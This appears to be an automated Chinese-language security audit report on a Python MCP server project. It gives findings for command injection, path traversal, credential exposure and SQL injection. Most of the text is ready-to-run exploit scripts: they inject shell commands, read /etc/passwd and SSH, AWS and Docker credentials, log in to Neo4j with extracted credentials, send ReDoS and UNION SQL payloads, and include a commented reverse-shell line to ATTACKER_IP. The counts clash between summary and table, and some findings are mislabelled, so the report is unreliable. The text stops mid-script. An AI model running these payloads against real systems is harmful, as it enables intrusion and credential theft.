# CodeSentinel 安全审计报告

## 项目信息
- **项目名称:** llm-security-audit
- **编程语言:** {"Python": 100.0}
- **文件数量:** 16
- **审计时间:** 2026-07-08 22:08:31

## 执行摘要

本次安全审计针对项目 'llm-security-audit' (Python 代码库，共 16 个文件，5140 行代码) 进行。审计发现 5 个高危及以上漏洞，包括 1 个严重级别的命令注入漏洞和 4 个高严重级别的路径遍历漏洞。这些漏洞均位于 MCP 服务器核心模块 `src/agents/mcp_server.py` 中，由于对用户输入的 `path` 参数缺乏充分的验证和清理，攻击者可以执行任意系统命令或读取服务器上的任意文件，可能导致服务器完全沦陷、敏感数据泄露以及横向移动攻击。建议立即修复所有已确认的漏洞。

**风险评分:** 92/100

## 漏洞统计

| 严重等级 | 数量 |
|---------|------|
| Critical | 6 |
| High | 9 |
| Medium | 3 |
| Low | 0 |
| **总计** | **18** |

## 漏洞详情

### VULN-FC9BB031 - 命令注入

- **严重等级:** CRITICAL
- **文件位置:** `src/agents/mcp_server.py:155`
- **数据流:** 用户通过params参数传入path -> params.get('path')获取target -> subprocess.run直接使用target作为命令行参数 -> 命令执行
- **判断理由:** 与bandit扫描类似，trufflehog扫描同样直接将用户输入的path参数传递给subprocess.run。攻击者可以构造恶意路径参数来影响命令执行行为，例如通过路径遍历或特殊字符绕过安全检查。

**代码片段:**
```
target = params.get("path", self.project_path)
try:
    result = subprocess.run(
        ["trufflehog", "filesystem", "--json", target],
        capture_output=True, text=True, timeout=120
    )
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC - 命令注入漏洞利用 (仅供研究使用)
漏洞ID: VULN-FC9BB031
目标: src/agents/mcp_server.py 中的 _tool_trufflehog_scan 方法
"""

import json
import requests

# 假设MCP服务器运行在本地8000端口
MCP_SERVER_URL = "http://localhost:8000/mcp"

def exploit_command_injection():
    """
    利用命令注入漏洞执行任意命令
    
    漏洞原理：
    _tool_trufflehog_scan 方法中，用户传入的 path 参数直接传递给 subprocess.run
    作为命令行参数，没有经过任何过滤或转义。攻击者可以通过构造特殊字符
    (如 ;, |, `, $() 等) 注入额外命令。
    """
    
    # PoC 1: 基础命令注入 - 执行 id 命令
    print("[*] PoC 1: 基础命令注入 - 执行 id 命令")
    payload_1 = {
        "tool": "scan_secrets",
        "params": {
            "path": "; id #"
        }
    }
    
    try:
        response = requests.post(MCP_SERVER_URL, json=payload_1, timeout=10)
        print(f"[+] 响应: {response.text[:500]}")
    except Exception as e:
        print(f"[-] 请求失败: {e}")
    
    # PoC 2: 读取敏感文件
    print("\n[*] PoC 2: 读取 /etc/passwd")
    payload_2 = {
        "tool": "scan_secrets",
        "params": {
            "path": "; cat /etc/passwd #"
        }
    }
    
    try:
        response = requests.post(MCP_SERVER_URL, json=payload_2, timeout=10)
        print(f"[+] 响应: {response.text[:500]}")
    except Exception as e:
        print(f"[-] 请求失败: {e}")
    
    # PoC 3: 反向shell (需要攻击者监听)
    print("\n[*] PoC 3: 反向shell (需要修改IP和端口)")
    # 注意: 实际利用时需要替换为攻击者IP和端口
    # payload_3 = {
    #     "tool": "scan_secrets",
    #     "params": {
    #         "path": "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 #"
    #     }
    # }
    
    # PoC 4: 使用管道符
    print("\n[*] PoC 4: 使用管道符执行命令")
    payload_4 = {
        "tool": "scan_secrets",
        "params": {
            "path": "| ls -la"
        }
    }
    
    try:
        response = requests.post(MCP_SERVER_URL, json=payload_4, timeout=10)
        print(f"[+] 响应: {response.text[:500]}")
    except Exception as e:
        print(f"[-] 请求失败: {e}")
    
    # PoC 5: 命令替换
    print("\n[*] PoC 5: 命令替换 - 使用反引号")
    payload_5 = {
        "tool": "scan_secrets",
        "params": {
            "path": "`whoami`"
        }
    }
    
    try:
        response = requests.post(MCP_SERVER_URL, json=payload_5, timeout=10)
        print(f"[+] 响应: {response.text[:500]}")
    except Exception as e:
        print(f"[-] 请求失败: {e}")

if __name__ == "__main__":
    print("=" * 60)
    print("VULN-FC9BB031 命令注入漏洞 PoC (仅供研究使用)")
    print("=" * 60)
    print()
    
    # 检查MCP服务器是否可访问
    try:
        requests.get(MCP_SERVER_URL, timeout=5)
        print("[+] MCP服务器可访问，开始漏洞利用...")
        exploit_command_injection()
    except requests.exceptions.ConnectionError:
        print("[-] 无法连接到MCP服务器，请确保服务器正在运行")
        print("[-] 默认URL: http://localhost:8000/mcp")
        print("\n[*] 如果服务器运行在其他地址，请修改 MCP_SERVER_URL 变量")
        print("\n[*] 也可以直接使用 curl 命令测试:")
        print('    curl -X POST http://localhost:8000/mcp \')
        print('      -H "Content-Type: application/json" \')
        print('      -d \'{"tool":"scan_secrets","params":{"path":"; id #"}}\'')

```

---

### VULN-6481DAF7 - 路径遍历

- **严重等级:** HIGH
- **文件位置:** `src/agents/mcp_server.py:178`
- **数据流:** 用户通过params传入path -> os.walk(target)遍历目录 -> 读取文件内容 -> 返回匹配结果
- **判断理由:** target参数直接来自用户输入，未经过路径规范化或白名单校验。攻击者可以通过传入'../'等路径遍历序列访问项目目录之外的文件系统，导致敏感信息泄露。os.walk会递归遍历所有子目录，扩大了攻击面。

**代码片段:**
```
for root, _, files in os.walk(target):
    for f in files:
        if f.endswith(file_ext):
            fpath = os.path.join(root, f)
            try:
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as fp:
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC - 路径遍历漏洞利用 (VULN-6481DAF7)
仅供安全研究使用，请勿用于非法用途
"""

import requests
import json
import sys

# 目标服务器配置
TARGET_URL = "http://localhost:8080"  # 请替换为实际目标地址

# 漏洞利用函数
def exploit_path_traversal(target_url, traversal_path):
    """
    利用路径遍历漏洞读取任意文件
    
    Args:
        target_url: MCP服务器地址
        traversal_path: 遍历路径，如 '../../../etc/passwd'
    """
    # 构造恶意请求
    payload = {
        "tool_name": "scan_pattern",
        "params": {
            "path": traversal_path,
            "pattern": ".*"  # 匹配所有文件
        }
    }
    
    try:
        # 发送请求
        response = requests.post(
            f"{target_url}/call_tool",
            json=payload,
            timeout=30
        )
        
        if response.status_code == 200:
            result = response.json()
            print(f"[+] 成功读取路径: {traversal_path}")
            print(f"[+] 响应内容:\n{json.dumps(result, indent=2)}")
            return result
        else:
            print(f"[-] 请求失败，状态码: {response.status_code}")
            print(f"[-] 响应: {response.text}")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[-] 网络错误: {e}")
        return None

# 测试用例
def run_poc():
    """执行PoC测试"""
    print("=" * 60)
    print("路径遍历漏洞 PoC (VULN-6481DAF7)")
    print("仅供安全研究使用")
    print("=" * 60)
    
    # 测试1: 读取/etc/passwd (Linux)
    print("\n[测试1] 尝试读取 /etc/passwd")
    exploit_path_traversal(TARGET_URL, "../../../etc/passwd")
    
    # 测试2: 读取Windows系统文件
    print("\n[测试2] 尝试读取 Windows 系统文件")
    exploit_path_traversal(TARGET_URL, "../../../../Windows/System32/drivers/etc/hosts")
    
    # 测试3: 读取应用程序配置文件
    print("\n[测试3] 尝试读取应用程序配置")
    exploit_path_traversal(TARGET_URL, "../../config/application.properties")
    
    # 测试4: 读取敏感凭证文件
    print("\n[测试4] 尝试读取 SSH 私钥")
    exploit_path_traversal(TARGET_URL, "../../../../home/user/.ssh/id_rsa")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        TARGET_URL = sys.argv[1]
    run_poc()
```

---

### VULN-7EC29975 - 路径遍历

- **严重等级:** HIGH
- **文件位置:** `src/agents/mcp_server.py:130`
- **数据流:** 用户通过params传入path -> params.get('path')获取target -> bandit -r target扫描目录 -> 返回扫描结果
- **判断理由:** bandit扫描工具会递归扫描目标目录下的所有文件。攻击者可以通过传入'../../etc'等路径遍历参数，使bandit扫描系统敏感目录，并将扫描结果返回给攻击者，导致系统配置信息泄露。

**代码片段:**
```
target = params.get("path", self.project_path)
try:
    result = subprocess.run(
        ["bandit", "-r", target, "-f", "json"],
        capture_output=True, text=True, timeout=120
    )
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC - 路径遍历漏洞利用 (仅供研究使用)
漏洞ID: VULN-7EC29975
目标: MCP Server _tool_bandit_scan 方法
"""

import json
import requests

# ============================================================
# 配置
# ============================================================
MCP_SERVER_URL = "http://localhost:8080/mcp"  # MCP服务器地址

# ============================================================
# PoC 1: 基础路径遍历 - 扫描 /etc 目录
# ============================================================
def poc_basic_etc_scan():
    """
    利用路径遍历扫描 /etc 目录
    预期效果: 返回 /etc 目录下所有文件的bandit扫描结果
    """
    payload = {
        "jsonrpc": "2.0",
        "method": "call_tool",
        "params": {
            "tool_name": "scan_python_security",
            "params": {
                "path": "../../etc"  # 路径遍历攻击
            }
        },
        "id": 1
    }
    
    print("[*] PoC 1: 扫描 /etc 目录")
    print(f"[*] 发送payload: {json.dumps(payload, indent=2)}")
    
    try:
        response = requests.post(MCP_SERVER_URL, json=payload, timeout=30)
        result = response.json()
        
        if "result" in result and result["result"]["status"] == "completed":
            print("[+] 漏洞利用成功!")
            print(f"[+] 发现 {result['result']['total_issues']} 个问题")
            for issue in result["result"]["issues"][:5]:  # 只显示前5个
                print(f"    - 文件: {issue['file']}")
                print(f"      行号: {issue['line']}")
                print(f"      严重性: {issue['severity']}")
                print(f"      描述: {issue['text'][:100]}...")
        else:
            print("[-] 漏洞利用失败")
            print(f"[-] 响应: {result}")
            
    except Exception as e:
        print(f"[-] 请求失败: {e}")

# ============================================================
# PoC 2: 深度路径遍历 - 扫描 /var/log
# ============================================================
def poc_deep_path_traversal():
    """
    利用深度路径遍历扫描 /var/log 目录
    预期效果: 返回系统日志文件中的敏感信息
    """
    payload = {
        "jsonrpc": "2.0",
        "method": "call_tool",
        "params": {
            "tool_name": "scan_python_security",
            "params": {
                "path": "../../../../var/log"  # 深度路径遍历
            }
        },
        "id": 2
    }
    
    print("\n[*] PoC 2: 深度路径遍历 - 扫描 /var/log")
    print(f"[*] 发送payload: {json.dumps(payload, indent=2)}")
    
    try:
        response = requests.post(MCP_SERVER_URL, json=payload, timeout=30)
        result = response.json()
        
        if "result" in result and result["result"]["status"] == "completed":
            print("[+] 漏洞利用成功!")
            print(f"[+] 发现 {result['result']['total_issues']} 个问题")
            for issue in result["result"]["issues"][:5]:
                print(f"    - 文件: {issue['file']}")
                print(f"      行号: {issue['line']}")
                print(f"      严重性: {issue['severity']}")
                print(f"      描述: {issue['text'][:100]}...")
        else:
            print("[-] 漏洞利用失败")
            print(f"[-] 响应: {result}")
            
    except Exception as e:
        print(f"[-] 请求失败: {e}")

# ============================================================
# PoC 3: 绝对路径遍历 - 扫描 /root
# ============================================================
def poc_absolute_path():
    """
    使用绝对路径扫描 /root 目录
    预期效果: 返回root用户目录下的敏感文件信息
    """
    payload = {
        "jsonrpc": "2.0",
        "method": "call_tool",
        "params": {
            "tool_name": "scan_python_security",
            "params": {
                "path": "/root"  # 绝对路径遍历
            }
        },
        "id": 3
    }
    
    print("\n[*] PoC 3: 绝对路径遍历 - 扫描 /root")
    print(f"[*] 发送payload: {json.dumps(payload, indent=2)}")
    
    try:
        response = requests.post(MCP_SERVER_URL, json=payload, timeout=30)
        result = response.json()
        
        if "result" in result and result["result"]["status"] == "completed":
            print("[+] 漏洞利用成功!")
            print(f"[+] 发现 {result['result']['total_issues']} 个问题")
            for issue in result["result"]["issues"][:5]:
                print(f"    - 文件: {issue['file']}")
                print(f"      行号: {issue['line']}")
                print(f"      严重性: {issue['severity']}")
                print(f"      描述: {issue['text'][:100]}...")
        else:
            print("[-] 漏洞利用失败")
            print(f"[-] 响应: {result}")
            
    except Exception as e:
        print(f"[-] 请求失败: {e}")

# ============================================================
# PoC 4: 使用curl命令的PoC
# ============================================================
def generate_curl_poc():
    """
    生成curl命令形式的PoC
    """
    print("\n[*] PoC 4: curl命令形式的PoC")
    print("\n# 扫描 /etc 目录:")
    print('''curl -X POST http://localhost:8080/mcp \\
  -H "Content-Type: application/json" \\
  -d '{
    "jsonrpc": "2.0",
    "method": "call_tool",
    "params": {
      "tool_name": "scan_python_security",
      "params": {
        "path": "../../etc"
      }
    },
    "id": 1
  }' ''')
    
    print("\n# 扫描 /var/log 目录:")
    print('''curl -X POST http://localhost:8080/mcp \\
  -H "Content-Type: application/json" \\
  -d '{
    "jsonrpc": "2.0",
    "method": "call_tool",
    "params": {
      "tool_name": "scan_python_security",
      "params": {
        "path": "../../../../var/log"
      }
    },
    "id": 2
  }' ''')
    
    print("\n# 扫描 /root 目录:")
    print('''curl -X POST http://localhost:8080/mcp \\
  -H "Content-Type: application/json" \\
  -d '{
    "jsonrpc": "2.0",
    "method": "call_tool",
    "params": {
      "tool_name": "scan_python_security",
      "params": {
        "path": "/root"
      }
    },
    "id": 3
  }' ''')

# ============================================================
# 主函数
# ============================================================
if __name__ == "__main__":
    print("=" * 60)
    print("PoC - 路径遍历漏洞利用 (仅供研究使用)")
    print("漏洞ID: VULN-7EC29975")
    print("=" * 60)
    print()
    
    # 执行PoC
    poc_basic_etc_scan()
    poc_deep_path_traversal()
    poc_absolute_path()
    generate_curl_poc()
    
    print("\n" + "=" * 60)
    print("PoC执行完毕")
    print("=" * 60)
```

---

### VULN-EE9E72B8 - 路径遍历

- **严重等级:** HIGH
- **文件位置:** `src/agents/mcp_server.py:155`
- **数据流:** 用户通过params传入path -> params.get('path')获取target -> trufflehog filesystem --json target扫描目录 -> 返回扫描结果
- **判断理由:** trufflehog用于扫描硬编码密钥，攻击者可以通过路径遍历参数扫描系统敏感目录（如/etc/shadow、/root/.ssh等），获取系统密钥和凭证信息。

**代码片段:**
```
target = params.get("path", self.project_path)
try:
    result = subprocess.run(
        ["trufflehog", "filesystem", "--json", target],
        capture_output=True, text=True, timeout=120
    )
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC - 路径遍历漏洞利用 (仅供安全研究使用)
漏洞ID: VULN-EE9E72B8
目标: MCP Server _tool_trufflehog_scan 方法
"""

import json
import requests

# ============================================================
# PoC 1: 通过 MCP JSON-RPC 协议直接调用 (标准利用方式)
# ============================================================

def poc_mcp_rpc_exploit(target_url: str, scan_path: str) -> dict:
    """
    通过 MCP JSON-RPC 调用 scan_secrets 工具，传入恶意路径
    
    Args:
        target_url: MCP Server 地址 (如 http://localhost:8080/mcp)
        scan_path: 要扫描的恶意路径 (如 /etc, /root/.ssh)
    
    Returns:
        扫描结果，包含泄露的密钥信息
    """
    payload = {
        "jsonrpc": "2.0",
        "method": "call_tool",
        "params": {
            "tool_name": "scan_secrets",
            "params": {
                "path": scan_path  # 路径遍历注入点
            }
        },
        "id": 1
    }
    
    response = requests.post(target_url, json=payload)
    return response.json()


# ============================================================
# PoC 2: 直接调用 MCPServer 类 (本地测试)
# ============================================================

def poc_direct_exploit(project_path: str, malicious_path: str) -> dict:
    """
    直接实例化 MCPServer 并调用漏洞方法
    
    Args:
        project_path: 正常项目路径
        malicious_path: 恶意路径 (如 /etc, /root/.ssh)
    """
    from src.agents.mcp_server import MCPServer
    
    server = MCPServer(project_path)
    
    # 调用漏洞方法
    result = server.call_tool("scan_secrets", {
        "path": malicious_path
    })
    
    return result


# ============================================================
# 利用示例
# ============================================================

if __name__ == "__main__":
    print("=" * 60)
    print("PoC - 路径遍历漏洞利用 (仅供安全研究使用)")
    print("漏洞ID: VULN-EE9E72B8")
    print("=" * 60)
    
    # 示例1: 扫描 /etc 目录 (可能泄露系统配置中的密钥)
    print("\n[+] 示例1: 扫描 /etc 目录")
    print("    目标: 获取系统配置文件中的密钥")
    print("    调用: scan_secrets(path='/etc')")
    print("    预期: trufflehog 扫描 /etc 下所有文件，返回发现的密钥")
    
    # 示例2: 扫描 SSH 密钥目录
    print("\n[+] 示例2: 扫描 SSH 密钥目录")
    print("    目标: 获取 SSH 私钥")
    print("    调用: scan_secrets(path='/root/.ssh')")
    print("    预期: 扫描 /root/.ssh 目录，泄露 id_rsa 等私钥文件中的密钥")
    
    # 示例3: 扫描 AWS 凭证
    print("\n[+] 示例3: 扫描 AWS 凭证")
    print("    目标: 获取 AWS 访问密钥")
    print("    调用: scan_secrets(path='/home/user/.aws')")
    print("    预期: 扫描 AWS 凭证文件，泄露 AWS_ACCESS_KEY_ID 等")
    
    # 示例4: 扫描 Docker 配置
    print("\n[+] 示例4: 扫描 Docker 配置")
    print("    目标: 获取 Docker 认证信息")
    print("    调用: scan_secrets(path='/root/.docker')")
    print("    预期: 扫描 Docker config.json，泄露 registry 认证信息")
    
    # 示例5: 扫描 Git 仓库
    print("\n[+] 示例5: 扫描 Git 仓库")
    print("    目标: 获取 Git 历史中的密钥")
    print("    调用: scan_secrets(path='/var/lib/jenkins/workspace/project/.git')")
    print("    预期: trufflehog 扫描 Git 历史，泄露提交中的密钥")
    
    print("\n" + "=" * 60)
    print("利用步骤:")
    print("1. 确定 MCP Server 地址 (如 http://target:8080/mcp)")
    print("2. 构造 JSON-RPC 请求，调用 scan_secrets 工具")
    print("3. 在 params 中设置 path 参数为恶意路径")
    print("4. 发送请求并解析返回的扫描结果")
    print("5. 从结果中提取泄露的密钥和凭证")
    print("=" * 60)
    
    # 实际利用示例 (注释掉，防止误执行)
    """
    # 实际利用代码 (取消注释以测试)
    target = "http://localhost:8080/mcp"
    
    # 扫描 /etc 目录
    result = poc_mcp_rpc_exploit(target, "/etc")
    print(json.dumps(result, indent=2))
    
    # 扫描 SSH 密钥
    result = poc_mcp_rpc_exploit(target, "/root/.ssh")
    print(json.dumps(result, indent=2))
    """
```

---

### VULN-B085A0BA - 不安全的文件读取

- **严重等级:** MEDIUM
- **文件位置:** `src/agents/mcp_server.py:178`
- **数据流:** 用户传入pattern和path -> 遍历目录 -> 打开文件 -> 正则匹配 -> 返回匹配内容
- **判断理由:** 该函数不仅允许路径遍历，还会将匹配到的文件内容（最多200字符）返回给调用者。攻击者可以通过构造特定的正则表达式来提取敏感信息，如密码、密钥、配置信息等。同时，正则表达式本身也可能导致ReDoS攻击（如果pattern来自用户输入）。

**代码片段:**
```
with open(fpath, 'r', encoding='utf-8', errors='ignore') as fp:
    for i, line in enumerate(fp, 1):
        if re.search(pattern, line):
            findings.append({
                "file": os.path.relpath(fpath, target),
                "line": i,
                "match": line.strip()[:200],
            })
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-B085A0BA - 不安全的文件读取漏洞
仅供安全研究使用，请勿用于非法用途
"""
import requests
import json

# 假设MCP Server运行在本地8000端口，通过JSON-RPC调用
target_url = "http://localhost:8000/mcp/call"

# 利用1: 路径遍历 + 敏感信息提取
# 读取 /etc/passwd 文件中的用户名信息
payload1 = {
    "tool_name": "scan_pattern",
    "params": {
        "path": "../../etc",  # 路径遍历，从项目目录跳转到/etc
        "pattern": "^[a-zA-Z0-9_]+:x:"  # 匹配passwd文件中的用户名行
    }
}

# 利用2: 读取配置文件中的密码
payload2 = {
    "tool_name": "scan_pattern",
    "params": {
        "path": "../../etc",
        "pattern": "password=|secret=|api_key="  # 匹配常见敏感信息
    }
}

# 利用3: ReDoS攻击 - 构造灾难性回溯的正则表达式
payload3 = {
    "tool_name": "scan_pattern",
    "params": {
        "path": ".",
        "pattern": "^(a+)+b$"  # 经典ReDoS模式，会导致CPU耗尽
    }
}

def send_poc(payload):
    """发送PoC请求"""
    try:
        response = requests.post(target_url, json=payload, timeout=10)
        print(f"[+] 请求发送成功")
        print(f"[+] 响应: {json.dumps(response.json(), indent=2, ensure_ascii=False)}")
        return response.json()
    except Exception as e:
        print(f"[-] 请求失败: {e}")
        return None

if __name__ == "__main__":
    print("="*60)
    print("VULN-B085A0BA PoC - 仅供安全研究使用")
    print("="*60)
    
    print("\n[测试1] 路径遍历 + 敏感信息提取")
    print("目标: 读取 /etc/passwd 文件")
    result1 = send_poc(payload1)
    
    print("\n[测试2] 配置文件密码提取")
    print("目标: 搜索包含密码/密钥的文件")
    result2 = send_poc(payload2)
    
    print("\n[测试3] ReDoS攻击")
    print("目标: 导致服务CPU耗尽")
    print("警告: 此测试可能导致服务不可用，请谨慎执行")
    # result3 = send_poc(payload3)  # 默认注释掉，防止意外影响
```

---

### VULN-BCD62A62 - 硬编码凭证

- **严重等级:** HIGH
- **文件位置:** `src\analyzers\graph_builder.py:37`
- **数据流:** 从config.settings.NEO4J_CONFIG读取凭证，但凭证可能以明文形式存储在配置文件中
- **判断理由:** Neo4j数据库的用户名和密码直接从配置文件中读取并以明文形式传递给数据库驱动。如果配置文件被泄露或存储在版本控制中，会导致数据库凭证泄露。建议使用环境变量或密钥管理服务存储敏感凭证。

**代码片段:**
```
self.driver = GraphDatabase.driver(
                config["uri"],
                auth=(config["user"], config["password"])
            )
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC - 硬编码凭证泄露利用
漏洞ID: VULN-BCD62A62
仅供安全研究使用
"""

import requests
import json
import sys

# ========== 配置区域 ==========
TARGET_URL = "http://target-app:8080"  # 目标应用地址
CONFIG_PATH = "/config/settings.py"    # 配置文件路径（可能通过路径遍历访问）
# ==============================

def check_path_traversal():
    """
    尝试通过路径遍历读取配置文件
    利用方式：目录遍历/SSRF/任意文件读取
    """
    print("[*] 尝试通过路径遍历读取配置文件...")
    
    # 常见路径遍历payload
    payloads = [
        f"{TARGET_URL}/../../config/settings.py",
        f"{TARGET_URL}/../../../config/settings.py",
        f"{TARGET_URL}/static/../../config/settings.py",
        f"{TARGET_URL}/download?file=../../config/settings.py",
        f"{TARGET_URL}/api/export?path=../../config/settings.py"
    ]
    
    for payload in payloads:
        try:
            resp = requests.get(payload, timeout=5, verify=False)
            if resp.status_code == 200 and "NEO4J_CONFIG" in resp.text:
                print(f"[+] 成功读取配置文件: {payload}")
                return resp.text
        except Exception as e:
            print(f"[-] 请求失败: {e}")
    return None

def check_git_leak():
    """
    检查.git目录泄露
    如果项目使用git且配置文件被提交，可直接下载
    """
    print("[*] 检查Git泄露...")
    git_urls = [
        f"{TARGET_URL}/.git/config",
        f"{TARGET_URL}/.git/HEAD",
        f"{TARGET_URL}/.git/objects/"
    ]
    
    for url in git_urls:
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                print(f"[+] Git泄露发现: {url}")
                return True
        except:
            pass
    return False

def extract_credentials(config_content):
    """
    从配置内容中提取Neo4j凭证
    """
    print("[*] 尝试提取Neo4j凭证...")
    
    # 简单的正则提取
    import re
    
    # 匹配NEO4J_CONFIG字典
    pattern = r"NEO4J_CONFIG\s*=\s*\{[^}]*'user'\s*:\s*['\"]([^'\"]+)['\"][^}]*'password'\s*:\s*['\"]([^'\"]+)['\"][^}]*'uri'\s*:\s*['\"]([^'\"]+)['\"]"
    match = re.search(pattern, config_content, re.DOTALL)
    
    if match:
        user = match.group(1)
        password = match.group(2)
        uri = match.group(3)
        print(f"[+] 凭证提取成功!")
        print(f"    URI: {uri}")
        print(f"    User: {user}")
        print(f"    Password: {password}")
        return {"uri": uri, "user": user, "password": password}
    else:
        print("[-] 未能提取凭证，尝试其他格式...")
        # 尝试更宽松的匹配
        if "NEO4J_CONFIG" in config_content:
            print("[*] 找到NEO4J_CONFIG，手动解析...")
            # 打印配置片段供分析
            start = config_content.find("NEO4J_CONFIG")
            end = config_content.find("\n\n", start)
            print(config_content[start:end])
        return None

def test_neo4j_connection(creds):
    """
    测试提取的凭证是否能连接Neo4j
    """
    print("[*] 测试Neo4j连接...")
    try:
        from neo4j import GraphDatabase
        
        driver = GraphDatabase.driver(
            creds["uri"],
            auth=(creds["user"], creds["password"])
        )
        driver.verify_connectivity()
        print("[+] Neo4j连接成功!")
        
        # 查询数据库信息
        with driver.session() as session:
            result = session.run("CALL dbms.listConfig() YIELD name, value WHERE name CONTAINS 'dbms.database' RETURN value")
            for record in result:
                print(f"    数据库: {record['value']}")
            
            # 列出所有节点
            result = session.run("MATCH (n) RETURN count(n) AS count")
            for record in result:
                print(f"    节点总数: {record['count']}")
                
        driver.close()
        return True
    except ImportError:
        print("[-] 需要安装neo4j驱动: pip install neo4j")
        return False
    except Exception as e:
        print(f"[-] 连接失败: {e}")
        return False

def main():
    print("=" * 60)
    print("VULN-BCD62A62 - 硬编码凭证PoC")
    print("仅供安全研究使用")
    print("=" * 60)
    
    # 步骤1: 尝试获取配置文件
    config_content = check_path_traversal()
    
    if not config_content:
        print("[*] 路径遍历失败，尝试Git泄露...")
        if check_git_leak():
            print("[*] Git泄露存在，尝试下载配置文件...")
            # 这里可以添加git clone逻辑
            pass
    
    if config_content:
        # 步骤2: 提取凭证
        creds = extract_credentials(config_content)
        
        if creds:
            # 步骤3: 测试连接
            test_neo4j_connection(creds)
    else:
        print("[-] 未能获取配置文件")
        print("[*] 建议手动检查以下位置:")
        print("    1. 应用配置文件: config/settings.py")
        print("    2. 环境变量文件: .env")
        print("    3. Docker环境变量")
        print("    4. 版本控制历史")

if __name__ == "__main__":
    main()
```

---

### VULN-DF772B9D - 不安全的错误信息泄露

- **严重等级:** MEDIUM
- **文件位置:** `src\analyzers\llm_api.py:155`
- **数据流:** API 响应内容（resp.text）被截取前200个字符后直接返回给调用者。如果 API 返回了包含敏感信息的错误消息（如 API Key 泄露、内部路径等），这些信息会被泄露。
- **判断理由:** 在错误处理中，直接将 API 返回的原始响应文本（resp.text）截取后返回。如果 LLM API 返回的错误信息中包含敏感数据（如认证信息、内部配置等），这些信息会通过错误消息泄露给上层调用者。

**代码片段:**
```
return {"error": f"API Error {resp.status_code}: {resp.text[:200]}"}
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-DF772B9D - 不安全的错误信息泄露
仅供安全研究使用
"""

import requests
import sys

# 配置目标 API 端点（假设本地测试环境）
TARGET_URL = "http://localhost:8080/api/analyze"  # 替换为实际目标

# 构造恶意请求，触发 API 返回包含敏感信息的错误
# 例如：使用无效的 API Key 或格式错误的请求

def exploit_error_leakage(target_url):
    """
    利用不安全的错误信息泄露漏洞
    通过构造特定请求触发 LLM API 返回包含敏感信息的错误响应
    """
    print("[*] 开始漏洞利用测试...")
    print("[*] 仅供安全研究使用")
    
    # 构造恶意 payload，尝试触发 API 返回敏感信息
    # 例如：发送格式错误的 JSON 或无效的认证信息
    malicious_payload = {
        "code": "print('test')",
        "file_path": "/etc/passwd",  # 尝试触发路径泄露
        "vuln_type": "command_injection"
    }
    
    # 发送请求
    try:
        print(f"[*] 发送恶意请求到 {target_url}")
        response = requests.post(
            target_url,
            json=malicious_payload,
            headers={
                "Content-Type": "application/json",
                "Authorization": "Bearer invalid_key_trigger_error"  # 无效 API Key
            },
            timeout=30
        )
        
        print(f"[*] 响应状态码: {response.status_code}")
        print(f"[*] 响应内容:\n{response.text[:500]}")  # 显示前500字符
        
        # 检查是否泄露了敏感信息
        sensitive_patterns = [
            "api_key",
            "secret",
            "token",
            "password",
            "internal",
            "debug",
            "stack trace",
            "traceback",
            "config",
            "environment",
            "credential"
        ]
        
        for pattern in sensitive_patterns:
            if pattern.lower() in response.text.lower():
                print(f"[!] 发现敏感信息泄露: 包含 '{pattern}'")
                print(f"[!] 漏洞确认: 错误信息中包含敏感数据")
                return True
        
        print("[*] 未检测到明显的敏感信息泄露")
        print("[*] 可能需要进一步测试不同的触发条件")
        return False
        
    except Exception as e:
        print(f"[!] 请求失败: {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = TARGET_URL
    
    print("=" * 60)
    print("VULN-DF772B9D PoC - 不安全的错误信息泄露")
    print("仅供安全研究使用")
    print("=" * 60)
    
    result = exploit_error_leakage(target)
    
    if result:
        print("\n[+] 漏洞利用成功: 检测到敏感信息泄露")
    else:
        print("\n[-] 漏洞利用未成功或目标已修复")
    
    sys.exit(0 if result else 1)
```

---

### VULN-3CB16730 - SQL注入

- **严重等级:** CRITICAL
- **文件位置:** `tests\vulnerable_app.py:29`
- **数据流:** 用户输入通过request.args.get('id')获取，直接通过f-string拼接进SQL查询字符串，然后传递给cursor.execute()执行
- **判断理由:** 用户可控的user_id参数未经任何过滤或参数化处理，直接拼接进SQL语句。攻击者可构造恶意输入如' OR '1'='1绕过认证或执行任意SQL命令

**代码片段:**
```
query = f"SELECT * FROM users WHERE id = '{user_id}'"
cursor.execute(query)
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
SQL注入漏洞PoC - 仅供安全研究使用
目标: tests/vulnerable_app.py 中的 /user 路由
"""

import requests
import sys

# 配置目标URL
TARGET_BASE = "http://localhost:8080"

def poc_basic_auth_bypass():
    """
    PoC 1: 基础认证绕过
    利用 ' OR '1'='1 绕过WHERE条件，返回所有用户
    """
    print("[*] PoC 1: 基础认证绕过 - 获取所有用户")
    payload = "' OR '1'='1"
    url = f"{TARGET_BASE}/user?id={payload}"
    
    try:
        resp = requests.get(url, timeout=5)
        print(f"[+] 请求URL: {url}")
        print(f"[+] 响应状态码: {resp.status_code}")
        print(f"[+] 响应内容: {resp.text}")
        
        if len(resp.text) > 10:
            print("[!] 成功! 返回了用户数据，认证被绕过")
        else:
            print("[-] 响应为空，可能未成功")
    except Exception as e:
        print(f"[-] 请求失败: {e}")

def poc_union_extract_data():
    """
    PoC 2: UNION注入提取数据
    利用 UNION SELECT 从其他表提取数据
    """
    print("\n[*] PoC 2: UNION注入 - 提取数据库信息")
    
    # 步骤1: 探测列数
    print("[*] 步骤1: 探测列数")
    for i in range(1, 6):
        payload = f"' UNION SELECT {','.join(['NULL'] * i)} -- "
        url = f"{TARGET_BASE}/user?id={payload}"
        try:
            resp = requests.get(url, timeout=5)
            if "error" not in resp.text.lower() and len(resp.text) > 5:
                print(f"[+] 列数: {i}")
                break
        except:
            pass
    
    # 步骤2: 获取SQLite版本
    print("[*] 步骤2: 获取SQLite版本")
    payload = "' UNION SELECT sqlite_version(), NULL, NULL -- "
